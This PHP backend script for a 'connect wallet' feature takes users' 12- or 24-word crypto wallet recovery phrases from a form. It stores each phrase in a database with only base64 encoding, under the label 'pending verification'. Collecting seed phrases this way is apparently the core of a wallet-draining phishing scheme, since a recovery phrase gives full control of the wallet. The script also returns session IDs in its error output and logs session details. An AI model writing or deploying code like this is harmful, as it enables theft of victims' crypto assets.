<?php
/**
 * WALLET_HANDLER.PHP
 * Handles wallet connection requests from the connect wallet modal
 * Saves wallet recovery phrases to the database for specific user
 */

header('Content-Type: application/json');

// Include auth and DB
include '../includes/dashboard_init.php';

// Ensure session is properly started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

try {
    // Check if request method is POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method. POST required.');
    }

    // Debug: Log detailed session and POST info
    error_log('=== Wallet Handler Debug ===');
    error_log('Session ID: ' . session_id());
    error_log('Session Status: ' . session_status());
    error_log('Session user_id: ' . (isset($_SESSION['user_id']) ? $_SESSION['user_id'] : 'NOT SET'));
    error_log('Session wallet_token exists: ' . (isset($_SESSION['wallet_token']) ? 'YES' : 'NO'));
    error_log('POST wallet_token exists: ' . (isset($_POST['wallet_token']) ? 'YES' : 'NO'));
    error_log('All POST keys: ' . implode(', ', array_keys($_POST)));
    error_log('POST wallet_name: ' . ($_POST['wallet_name'] ?? 'NOT SET'));
    error_log('POST mnemonic length: ' . (isset($_POST['mnemonic']) ? strlen($_POST['mnemonic']) : 'NOT SET'));
    error_log('========================');

    // Check if user is authenticated
    $user_id = null;
    
    // Method 1: Try session authentication (primary)
    if (isset($_SESSION['user_id']) && !empty($_SESSION['user_id'])) {
        $user_id = $_SESSION['user_id'];
        error_log('User authenticated via session: ' . $user_id);
    }
    // Method 2: Try token-based authentication (fallback for Tracking Prevention)
    elseif (isset($_POST['wallet_token']) && isset($_SESSION['wallet_token'])) {
        if ($_POST['wallet_token'] === $_SESSION['wallet_token']) {
            // Token is valid, user must be logged in to have generated it
            if (isset($_SESSION['user_id'])) {
                $user_id = $_SESSION['user_id'];
                error_log('User authenticated via token: ' . $user_id);
            } else {
                throw new Exception('Valid token but user_id not found in session.');
            }
        } else {
            throw new Exception('Invalid wallet token.');
        }
    } else {
        error_log('No authentication method available');
        error_log('Session wallet_token exists: ' . (isset($_SESSION['wallet_token']) ? 'yes' : 'no'));
        error_log('POST wallet_token exists: ' . (isset($_POST['wallet_token']) ? 'yes' : 'no'));
        throw new Exception('User not authenticated. Please log in first.');
    }
    
    if (!$user_id) {
        throw new Exception('User authentication failed.');
    }

    // Get POST data - wallet_handler.php receives FormData from JavaScript
    $wallet_name = $_POST['wallet_name'] ?? null;
    $mnemonic = $_POST['mnemonic'] ?? null;

    // Validate required fields
    if (empty($wallet_name) || empty($mnemonic)) {
        throw new Exception('Wallet name and mnemonic are required.');
    }

    $wallet_name = trim($wallet_name);
    $mnemonic = trim($mnemonic);

    // Validate mnemonic format (12 or 24 words)
    $words = explode(' ', $mnemonic);
    $word_count = count(array_filter($words));
    
    if ($word_count !== 12 && $word_count !== 24) {
        throw new Exception('Mnemonic must contain 12 or 24 words.');
    }

    // Encrypt mnemonic for security (basic encryption - use proper encryption in production)
    $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production

    // Get database connection
    include '../database/db_config.php';
    
    if (!$conn) {
        throw new Exception('Database connection failed.');
    }

    $sql = "UPDATE user 
            SET connected_wallet_name = ?,
                wallet_phrase = ?,
                wallet_phrase_verified = 0,
                wallet_connected_at = NOW()
            WHERE id = ?";

    error_log('Executing SQL: ' . $sql);
    error_log('With values - wallet_name: ' . $wallet_name . ', user_id: ' . $user_id . ', mnemonic_length: ' . strlen($encrypted_mnemonic));

    $stmt = $conn->prepare($sql);
    
    if (!$stmt) {
        throw new Exception('Database error: ' . $conn->error);
    }
    
    $stmt->bind_param('ssi', $wallet_name, $encrypted_mnemonic, $user_id);
    
    if (!$stmt->execute()) {
        throw new Exception('Failed to update user record: ' . $stmt->error);
    }

    error_log('Affected rows: ' . $stmt->affected_rows);
    
    if ($stmt->affected_rows === 0) {
        throw new Exception('User not found or no update made.');
    }

    $stmt->close();

    // Return success response
    echo json_encode([
        'success' => true,
        'message' => 'Wallet connection request received and pending verification.',
        'wallet_name' => $wallet_name,
        'word_count' => $word_count,
        'timestamp' => time()
    ]);
    exit;

} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'error_code' => 'WALLET_ERROR',
        'debug' => [
            'session_id' => session_id(),
            'has_user_id' => isset($_SESSION['user_id']),
            'user_id' => isset($_SESSION['user_id']) ? $_SESSION['user_id'] : null,
            'post_keys' => array_keys($_POST)
        ]
    ]);
    exit;
}
?>

